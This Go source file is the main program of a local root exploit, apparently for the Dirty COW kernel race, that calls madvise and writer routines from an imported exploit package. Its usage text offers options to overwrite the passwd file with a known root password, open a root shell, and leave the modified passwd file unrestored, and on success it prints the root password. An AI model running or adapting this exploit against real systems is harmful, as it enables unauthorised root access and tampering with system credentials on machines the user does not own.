// -----------------------------------------------------------------
// Copyright (C) 2017  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

package main

import "expl"

import(
     "flag"
     "os"
)

func printInfo(){

      os.Stderr.WriteString( 
                   os.Args[0]  +
                   " [-s] [-n] | [-h]\n"   +
                   " -s  open directly a shell, if the exploit is successful;\n"  +
                   " -n  combined with -s, doesn't restore the passwd file.\n"  +
                   " -h  print this synopsis;\n"  +
                   "\n If no param is specified, the program modifies the passwd file and exits.\n"  +
                   " A copy of the passwd file will be create in the current directory as .ssh_bak\n"  +
                   " (unprivileged user), if no parameter or -n is specified.\n")
      os.Exit(1)
}

func main(){

   sFlags    :=   flag.Bool("s", false, "Run root shell")
   hFlags    :=   flag.Bool("h", false, "Print the synopsis")
   nFlags    :=   flag.Bool("n", false, "Combined with -s, doesn't restore the passwd file")

   flag.Parse()

   if *hFlags  { printInfo() }

   if *nFlags && !*sFlags && len(os.Args) != 1{
        os.Stderr.WriteString("Invalid parameter: -n requires -s\n")
        printInfo()
   }

   ex     :=     expl.NewExpl(*nFlags)   
   go ex.Madviser()
   go ex.Writer()
   ex.Checker()
   ex.Shell(*sFlags, *nFlags)
   ex.RestoreTerm()

   var msg string
   switch *sFlags{
       case true:
           msg    =    "Exit.\n"
       default:
           msg    =    "Root password is:   " + expl.TXTPWD + "Enjoy! :-)\n"
   }

   if  ex.Iter != expl.MAXITER {
          os.Stderr.WriteString(msg)
          os.Exit(0)
   } else        {
          os.Stderr.WriteString("Exploit failed.\n")
          os.Exit(1)
   }
}
